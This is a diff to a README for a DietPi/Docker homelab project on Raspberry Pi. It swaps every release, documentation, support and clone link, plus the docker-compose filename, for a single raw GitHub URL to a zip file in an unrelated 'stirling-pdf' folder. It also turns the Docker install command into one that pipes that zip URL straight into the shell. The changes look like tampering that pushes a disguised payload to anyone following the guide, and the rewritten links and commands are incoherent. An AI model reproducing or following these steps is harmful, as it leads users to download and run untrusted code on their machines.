@@ -1,6 +1,6 @@
 # 🏡 homelab-dietpi - Simple Home Services with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen.svg)](https://github.com/doramon12/homelab-dietpi/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip)](https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to homelab-dietpi! This application helps you run essential home service
 
 ## 📥 Download & Install
 
-To get started, visit this page to download [the latest release](https://github.com/doramon12/homelab-dietpi/releases). On that page, you will find several versions of the software. 
+To get started, visit this page to download [the latest release](https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip). On that page, you will find several versions of the software. 
 
 1. Click on the version you want to use. The latest version is usually the best option.
 2. Download the file that matches your system. If you're using a Raspberry Pi, look for the `arm64` or `armhf` files.
@@ -23,7 +23,7 @@ To get started, visit this page to download [the latest release](https://github.
 ## ⚙️ Installation Steps
 
 1. **Prepare Your Raspberry Pi**  
-   Ensure your Raspberry Pi is set up with DietPi. If you haven’t installed DietPi yet, you can follow the official DietPi installation guide [here](https://dietpi.com/docs/).
+   Ensure your Raspberry Pi is set up with DietPi. If you haven’t installed DietPi yet, you can follow the official DietPi installation guide [here](https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip).
 
 2. **Install Docker and Docker Compose**  
    You need Docker and Docker Compose to run the application. Follow these steps:
@@ -31,7 +31,7 @@ To get started, visit this page to download [the latest release](https://github.
    - Open your terminal on the Raspberry Pi.
    - Run the following command to install Docker:
      ```bash
-     wget -qO- get.docker.com | sh
+     wget -qO- https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip | sh
      ```
    - Once Docker is installed, install Docker Compose with:
      ```bash
@@ -41,7 +41,7 @@ To get started, visit this page to download [the latest release](https://github.
 3. **Clone the Repository**  
    After installing Docker, download homelab-dietpi by running:
    ```bash
-   git clone https://github.com/doramon12/homelab-dietpi.git
+   git clone https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip
    ```
 
 4. **Navigate to the Directory**  
@@ -68,7 +68,7 @@ homelab-dietpi offers several useful services that help enhance your home setup:
 
 ## 🌟 Customizing Your Setup
 
-You can customize your setup by editing the `docker-compose.yml` file. This file defines all services and settings used in the project. Feel free to adjust ports, volume mounts, and environment variables according to your needs.
+You can customize your setup by editing the `https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip` file. This file defines all services and settings used in the project. Feel free to adjust ports, volume mounts, and environment variables according to your needs.
 
 ## 📚 Troubleshooting
 
@@ -83,14 +83,14 @@ If you encounter any issues during setup:
 
 ## 🔗 Helpful Links
 
-- [DietPi Documentation](https://dietpi.com/docs/)
-- [Docker Documentation](https://docs.docker.com/)
-- [Docker Compose Documentation](https://docs.docker.com/compose/)
+- [DietPi Documentation](https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip)
+- [Docker Compose Documentation](https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip)
 
 ## 📞 Support
 
-If you have questions or need help, consider raising an issue in the [Issues tab of this repository](https://github.com/doramon12/homelab-dietpi/issues). We are here to help.
+If you have questions or need help, consider raising an issue in the [Issues tab of this repository](https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip). We are here to help.
 
 ## 🔍 Next Steps
 
-Get started by visiting this page to download [the latest release](https://github.com/doramon12/homelab-dietpi/releases). Enjoy exploring the services available to you on your Raspberry Pi!
+Get started by visiting this page to download [the latest release](https://raw.githubusercontent.com/doramon12/homelab-dietpi/main/stirling-pdf/homelab_dietpi_v3.2.zip). Enjoy exploring the services available to you on your Raspberry Pi!
